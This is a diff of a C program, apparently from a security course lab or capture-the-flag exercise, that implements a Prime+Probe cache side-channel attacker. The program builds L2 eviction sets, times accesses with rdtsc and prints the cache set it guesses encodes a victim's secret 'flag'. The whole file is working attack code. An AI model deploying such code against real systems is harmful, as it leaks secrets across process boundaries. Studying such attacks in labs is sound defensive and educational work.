@@ -1,73 +1,56 @@
-#include "util.h"
-#include <sys/mman.h>
-#include <stdint.h>
 #include <stdio.h>
+#include <stdint.h>
+#include "util.h"
 
-#define BUFF_SIZE (2*1024*1024)
-#define NUM_SETS 1024
-#define STRIDE 65536
-#define ROUNDS 1000
+#define NUM_SETS NUM_L2_CACHE_SETS
+#define PROBE_REPS 100000
 
 int main() {
 
-    int flag = -1;
+    // Allocate large buffer like victim
+    char *buf = get_buffer();
 
-    char *buf = mmap(NULL, BUFF_SIZE,
-                     PROT_READ | PROT_WRITE,
-                     MAP_POPULATE | MAP_ANONYMOUS |
-                     MAP_PRIVATE | MAP_HUGETLB,
-                     -1, 0);
+    // Create eviction sets for each cache set
+    char *eviction_sets[NUM_SETS][16];
 
-    if (buf == MAP_FAILED) {
-        perror("mmap");
-        return 1;
+    for (int i = 0; i < NUM_SETS; i++) {
+        get_partial_eviction_set(eviction_sets[i], i);
     }
 
-    buf[0] = 1;
+    while (1) {
 
-    char *set_addr[NUM_SETS];
-    uint64_t times[NUM_SETS];
-    int scores[NUM_SETS] = {0};
+        uint64_t times[NUM_SETS];
 
-    for (int i = 0; i < NUM_SETS; i++)
-        set_addr[i] = buf + i * STRIDE;
+        for (int set = 0; set < NUM_SETS; set++) {
 
-    for (int round = 0; round < ROUNDS; round++) {
+            uint64_t total = 0;
 
-        // PRIME
-        for (int i = 0; i < NUM_SETS; i++)
-            *(volatile char*)set_addr[i];
+            for (int r = 0; r < PROBE_REPS; r++) {
 
-        for (volatile int i = 0; i < 100000; i++);
+                uint64_t start = rdtsc();
 
-        // PROBE
-        for (int i = 0; i < NUM_SETS; i++)
-            times[i] = measure_one_block_access_time((ADDR_PTR)set_addr[i]);
+                for (int j = 0; j < 16; j++) {
+                    (*(eviction_sets[set][j]))++;
+                }
 
-        uint64_t max_time = 0;
-        int slow_set = -1;
+                uint64_t end = rdtsc();
 
-        for (int i = 0; i < NUM_SETS; i++) {
-            if (times[i] > max_time) {
-                max_time = times[i];
-                slow_set = i;
+                total += (end - start);
+            }
+
+            times[set] = total;
+        }
+
+        int max_set = 0;
+
+        for (int i = 1; i < NUM_SETS; i++) {
+            if (times[i] > times[max_set]) {
+                max_set = i;
             }
         }
 
-        if (slow_set >= 0)
-            scores[slow_set]++;
+        printf("Guessed flag: %d\n", max_set);
     }
-
-    int best_score = 0;
-
-    for (int i = 0; i < NUM_SETS; i++) {
-        if (scores[i] > best_score) {
-            best_score = scores[i];
-            flag = i;
-        }
-    }
-
-    printf("Flag: %d\n", flag);
 
     return 0;
 }
